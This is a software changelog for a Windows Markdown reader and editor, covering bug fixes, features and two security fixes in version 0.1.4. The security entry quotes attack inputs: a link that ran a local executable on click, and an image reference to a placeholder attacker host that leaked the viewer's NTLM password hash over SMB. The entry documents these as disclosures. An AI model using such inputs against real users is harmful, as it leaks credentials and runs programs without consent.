# Changelog

All notable changes to Markdown Reader are recorded here. The format follows
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and this project uses
[semantic versioning](https://semver.org/spec/v2.0.0.html).

Each released version below corresponds to a [GitHub Release](https://github.com/BGonnermann/MarkdownReader/releases)
with a portable Windows build attached.

## [Unreleased]

### Added

- This changelog, so every version's changes are written down in one place.
- A security policy covering what counts as a vulnerability in a Markdown reader
  and how to report one.
- A screenshot in the README, plus badges for the current release and download count.

### Fixed

- A document containing raw HTML no longer renders as a blank preview. One void or
  unclosed tag - the `<img>` in a centred README header, for instance - swallowed
  every block after it, so this project's own README showed almost nothing. Raw
  HTML is now shown as text instead of being handed to the rich text engine.

### Changed

- Release notes are taken from this file's matching section instead of an
  auto-generated commit list, and the release build fails when a tag has no entry
  here. Each release also now states how to verify where the download came from.

## [0.1.4] - 2026-10-26

### Security

- Links no longer launch local programs on a single click. `[open me](payload.exe)`
  used to run the executable immediately; the app now asks for confirmation before
  opening a local file, a program, or a non-web protocol. Links to other Markdown
  files open inside the app instead.
- The preview no longer fetches anything from off this machine. Qt resolved image
  paths itself, so an image such as `![](//attacker/share/pixel.png)` made Windows
  open an SMB connection to that host and offer the current user's NTLM
  credentials - a tracking pixel that leaks a password hash, triggered just by
  previewing an untrusted document. UNC and remote references are now refused and
  reported in the status bar. Local images still work.

### Fixed

- In-document links to headings work. Qt renders Markdown without heading anchors,
  so every `[Section](#section)` link and every table of contents silently did
  nothing.
- Saving is atomic. The text is written to a temporary file and swapped into place,
  so a save that fails halfway no longer truncates the original. The file watcher is
  released for the duration of the swap, because Qt holds a handle on the watched
  file and Windows otherwise denies the replace.
- Files keep their encoding and line endings. LF files are no longer converted to
  CRLF, CR-only files stay CR, and Windows-1252 and UTF-8 BOM files survive a save
  instead of being corrupted.
- The preview no longer jumps back to the top on every keystroke.
- Find works in preview-only view. `Shift+F3` and `Shift+Enter` find the previous
  match, and `Esc` closes the find bar.
- Moving the cursor in a large file no longer lags; the word count comes from the
  last render instead of being recomputed on every cursor move.
- Zoom is clamped to a sensible range, and `Ctrl+Wheel` zooms both panes together.
- The About box reads its version from the package instead of a hardcoded string.

### Added

- Reloads automatically when another program changes the open file, asking first if
  there are unsaved edits.
- Status bar showing line, column, word count, encoding, and line endings.
- The split divider, view mode, and zoom level are remembered between sessions.
- The unsaved-changes prompt names the file, and dialogs open in the last folder used.
- Releases are built by GitHub Actions from a pushed tag, on a clean runner. The job
  refuses to build when the tag disagrees with either version string, verifies the
  archive extracts complete, and attests the result.
- `ruff` configuration, a dev dependency, and a CI lint step.

## [0.1.3] - 2026-09-08

### Fixed

- The View menu and toolbar stay in sync when switching between split, preview, and
  editor layouts.
- The Open and Save As dialogs remember the last directory used.

## [0.1.2] - 2026-07-18

### Fixed

- Relative Markdown links such as `chapter.md#details` keep their fragment target.
- Same-document links such as `#details` stay in the live preview instead of being
  handed to the operating system.

## [0.1.1] - 2026-07-11

### Fixed

- Drag-and-drop opening works again across both the editor and preview panes.

## [0.1.0] - 2026-07-10

First public release: a lightweight Windows desktop application for reading,
editing, and exporting Markdown.

### Added

- Drag-and-drop file opening and a live GitHub-styled preview.
- Split, preview-only, and editor-only layouts.
- New, Open, Close, Save, and Save As.
- Export the rendered document to PDF.
- Zoom and text search.
- Recent-file history and unsaved-change protection.
- Local image and link support.

[Unreleased]: https://github.com/BGonnermann/MarkdownReader/compare/v0.1.4...HEAD
[0.1.4]: https://github.com/BGonnermann/MarkdownReader/compare/v0.1.3...v0.1.4
[0.1.3]: https://github.com/BGonnermann/MarkdownReader/compare/v0.1.2...v0.1.3
[0.1.2]: https://github.com/BGonnermann/MarkdownReader/compare/v0.1.1...v0.1.2
[0.1.1]: https://github.com/BGonnermann/MarkdownReader/compare/v0.1.0...v0.1.1
[0.1.0]: https://github.com/BGonnermann/MarkdownReader/releases/tag/v0.1.0
